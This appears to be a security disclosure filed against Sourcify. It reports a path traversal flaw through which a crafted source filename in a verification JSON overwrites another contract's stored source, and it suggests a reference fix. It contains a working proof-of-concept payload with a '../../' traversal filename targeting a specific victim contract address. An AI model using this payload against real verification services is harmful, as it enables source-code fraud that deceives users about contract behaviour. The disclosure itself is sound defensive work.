# Path traversal vulnerability that can lead to overwriting of arbitrary source code results

## Introduction
In Sourcify, there is a path-traversal problem risk in the source code validation stored procedure. Specifically, we can define a contract file named ..hellobloc/../../../../../victim contract address/sources/a.sol in json-stardant. Thereby allowing source code files to be stored outside the expected path, e.g. the above filename allows the a.sol file to exist under the victim contract path, resulting in source code fraud as well as source code replacement.

## Attack Case

//Victimization Contract Source Code

https://repo.staging.sourcify.dev/contracts/partial_match/420/0x107D559924d935a7e56fd41D5ee4fAF36aCc5C7e/sources

//Victimization Real Contract Source Code

https://goerli-optimism.etherscan.io/address/0x107D559924d935a7e56fd41D5ee4fAF36aCc5C7e#code 

//Attack Contract Source Code
https://repo.staging.sourcify.dev/contracts/partial_match/420/0xa4369e612A00C5677DEE4C7ceCd75D1E36CAd41D/ 

The json file used for etherscan verification
```json
{
    "language": "Solidity",
    "sources": {
        "..hellobloc/../../../../../0x107D559924d935a7e56fd41D5ee4fAF36aCc5C7e/sources/Token.sol": {"content": "//verify for 0xa4369e612A00C5677DEE4C7ceCd75D1E36CAd41D \n contract UniswapV2Pair {\n    u...\n    }\n}"}
    },
    "settings": {
        "optimizer": {
          "enabled": false
        },
        "remappings": []
    }
}
```
## Related issue code
https://github.com/ethereum/sourcify/blob/baf549ecc1814ca9eb4b7632d69ecd25aa4dae3f/src/server/services/RepositoryService.ts#L633-L637

## Implementations that can be used for reference
Some code that will help you solve the problem of path traversal. This is the solution used by foundry at the cast. It may be helpful for you to solve the path traversal.

https://sourcegraph.com/crates/ethers-etherscan@9e675141953f88a190ac883ad02841370836d35c/-/blob/src/source_tree.rs?L19-20
